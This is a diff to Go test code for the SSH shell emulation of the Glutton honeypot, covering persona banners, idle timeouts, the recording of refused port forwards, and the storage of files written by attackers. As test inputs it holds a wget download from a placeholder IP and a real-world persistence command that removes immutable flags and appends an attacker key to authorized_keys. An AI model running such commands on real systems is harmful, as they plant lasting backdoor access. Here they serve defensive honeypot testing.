@@ -3,9 +3,13 @@ package tcp
 import (
 	"io"
 	"net"
+	"os"
+	"path/filepath"
 	"strings"
 	"testing"
+	"time"
 
+	"github.com/mushorg/glutton/protocols/helpers"
 	"github.com/mushorg/glutton/protocols/recall"
 	sshproto "github.com/mushorg/glutton/protocols/tcp/ssh"
 	"github.com/spf13/viper"
@@ -18,7 +22,22 @@ func startShellSSH(t *testing.T, store *recall.Store, pick int) (string, *fakeHo
 	useSSHRecall(t, store, pick)
 	viper.Set("ssh.shell", true)
 	t.Cleanup(func() { viper.Set("ssh.shell", nil) })
+	useSSHStore(t)
 	return serveSSH(t)
+}
+
+// sshStoreDir is where the latest useSSHStore keeps files.
+var sshStoreDir string
+
+// useSSHStore keeps the files the shell writes in a temporary directory.
+func useSSHStore(t *testing.T) string {
+	t.Helper()
+	dir := t.TempDir()
+	sshStoreDir = dir
+	old := sshStore
+	sshStore = func(data []byte, _ string) (string, error) { return helpers.Store(data, dir) }
+	t.Cleanup(func() { sshStore = old })
+	return dir
 }
 
 // sshDial logs in with a password, retrying until the shell opens.
@@ -42,7 +61,9 @@ func TestSSHShellExec(t *testing.T) {
 	sess, err := client.NewSession()
 	require.NoError(t, err)
 	out, err := sess.CombinedOutput("uname -s; cat /etc/os-release | head -1; wget http://198.51.100.9/x.sh")
-	require.NoError(t, err)
+	var exit *cryptossh.ExitError
+	require.ErrorAs(t, err, &exit, "wget fails like a host without network")
+	require.Equal(t, 4, exit.ExitStatus())
 	require.Contains(t, string(out), "Linux\n")
 	require.Contains(t, string(out), "Debian GNU/Linux 12 (bookworm)")
 	require.Contains(t, string(out), "wget: unable to resolve host address")
@@ -130,7 +151,7 @@ func TestSSHRecallPersonaAndAttempts(t *testing.T) {
 }
 
 func TestSSHPersonaOverride(t *testing.T) {
-	viper.Set("ssh.persona", "centos-7")
+	viper.Set("ssh.persona", "debian-11")
 	t.Cleanup(func() { viper.Set("ssh.persona", nil) })
 	addr, hp, done := startSSH(t)
 	conn, err := net.Dial("tcp", addr)
@@ -138,10 +159,10 @@ func TestSSHPersonaOverride(t *testing.T) {
 	buf := make([]byte, 64)
 	n, err := conn.Read(buf)
 	require.NoError(t, err)
-	require.True(t, strings.HasPrefix(string(buf[:n]), "SSH-2.0-OpenSSH_7.4\r\n"))
+	require.True(t, strings.HasPrefix(string(buf[:n]), "SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3\r\n"))
 	conn.Close()
 	_, frames := waitSSHEvent(t, hp, done)
-	require.Equal(t, "centos-7", frames[0].Variant)
+	require.Equal(t, "debian-11", frames[0].Variant)
 }
 
 func TestSSHPersonasValid(t *testing.T) {
@@ -153,4 +174,102 @@ func TestSSHPersonasValid(t *testing.T) {
 		require.NotContains(t, strings.ToLower(p.Hostname+p.Version), "glutton")
 	}
 	require.Equal(t, sshproto.ServerVersion, sshproto.Personas[0].Version)
+}
+
+// the command line of the authorized_keys implant seen in the wild
+const sshImplant = `uname -a && nproc && sh -c 'cd ~ && \
+mkdir -p .ssh && \
+chattr -i .ssh 2>/dev/null || true && \
+cd .ssh && \
+chattr -i authorized_keys 2>/dev/null || true && \
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAk33BTdNE $(whoami)@$(hostname)" >> authorized_keys && \
+chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys'`
+
+// The implant runs to the end, its key is recorded and stored, and a second
+// session of the same connection sees the file. The connection then closes by
+// itself once nothing runs for the idle timeout.
+func TestSSHShellImplantAndIdleClose(t *testing.T) {
+	viper.Set("ssh.idle_timeout", 200*time.Millisecond)
+	t.Cleanup(func() { viper.Set("ssh.idle_timeout", nil) })
+	addr, hp, done := startShellSSH(t, recall.New(recall.DefaultConfig()), 3)
+	dir := sshStoreDir
+	client := sshDial(t, addr, "kafei", "kafei123456")
+
+	sess, err := client.NewSession()
+	require.NoError(t, err)
+	out, err := sess.CombinedOutput(sshImplant)
+	require.NoError(t, err, string(out))
+	require.Contains(t, string(out), "Linux debian ")
+
+	sess, err = client.NewSession()
+	require.NoError(t, err)
+	out, err = sess.CombinedOutput("cat ~/.ssh/authorized_keys; ls -la ~/.ssh")
+	require.NoError(t, err)
+	require.Contains(t, string(out), "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAk33BTdNE kafei@debian\n")
+	require.Contains(t, string(out), "-rw------- 1 kafei kafei")
+
+	// the client stays connected; the idle timeout ends the visit
+	ev, frames := waitSSHEvent(t, hp, done)
+	require.Equal(t, "handler_close", ev.endReason)
+	writes := sshFramesByCommand(frames, "read", "write-file")
+	require.Len(t, writes, 1)
+	require.Equal(t, "/home/kafei/.ssh/authorized_keys", writes[0].Path)
+	require.Equal(t, "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAk33BTdNE kafei@debian\n", string(writes[0].Payload))
+	require.Equal(t, helpers.SHA256Hex(writes[0].Payload), writes[0].PayloadHash)
+	stored, err := os.ReadFile(filepath.Join(dir, writes[0].PayloadHash))
+	require.NoError(t, err)
+	require.Equal(t, writes[0].Payload, stored)
+	require.Len(t, sshFramesByCommand(frames, "read", "exec"), 2)
+	for _, f := range sshFramesByCommand(frames, "write", "cmd") {
+		require.Equal(t, "ok", f.Status)
+	}
+	client.Close()
+}
+
+// Port forwards and global requests are recorded with their target and refused.
+func TestSSHRecordsRefusedChannelsAndRequests(t *testing.T) {
+	viper.Set("ssh.idle_timeout", 200*time.Millisecond)
+	t.Cleanup(func() { viper.Set("ssh.idle_timeout", nil) })
+	addr, hp, done := startShellSSH(t, recall.New(recall.DefaultConfig()), 0)
+	client := sshDial(t, addr, "root", "root")
+
+	_, err := client.Dial("tcp", "203.0.113.7:6379")
+	require.Error(t, err, "the forward is refused")
+	ok, _, err := client.SendRequest("tcpip-forward", true, cryptossh.Marshal(struct {
+		Addr string
+		Port uint32
+	}{"0.0.0.0", 2222}))
+	require.NoError(t, err)
+	require.False(t, ok)
+	sess, err := client.NewSession()
+	require.NoError(t, err)
+	require.Error(t, sess.RequestSubsystem("sftp"))
+
+	_, frames := waitSSHEvent(t, hp, done)
+	chans := sshFramesByCommand(frames, "read", "channel-open")
+	require.Len(t, chans, 1)
+	require.Equal(t, "direct-tcpip", chans[0].Type)
+	require.Equal(t, "203.0.113.7:6379", chans[0].Target)
+	globals := sshFramesByCommand(frames, "read", "global-request")
+	require.Len(t, globals, 1)
+	require.Equal(t, "tcpip-forward", globals[0].Type)
+	require.Equal(t, "0.0.0.0:2222", globals[0].Target)
+	reqs := sshFramesByCommand(frames, "read", "channel-request")
+	require.Len(t, reqs, 1)
+	require.Equal(t, "subsystem", reqs[0].Type)
+	client.Close()
+}
+
+// A client that logs in and never opens a session no longer holds the
+// connection for the full connection timeout.
+func TestSSHIdleBeforeSession(t *testing.T) {
+	viper.Set("ssh.idle_timeout", 100*time.Millisecond)
+	t.Cleanup(func() { viper.Set("ssh.idle_timeout", nil) })
+	addr, hp, done := startShellSSH(t, recall.New(recall.DefaultConfig()), 0)
+	client := sshDial(t, addr, "root", "root")
+	start := time.Now()
+	_, frames := waitSSHEvent(t, hp, done)
+	require.Less(t, time.Since(start), 5*time.Second)
+	require.Equal(t, "success", sshFramesByCommand(frames, "write", "auth-password")[3].Status)
+	client.Close()
 }
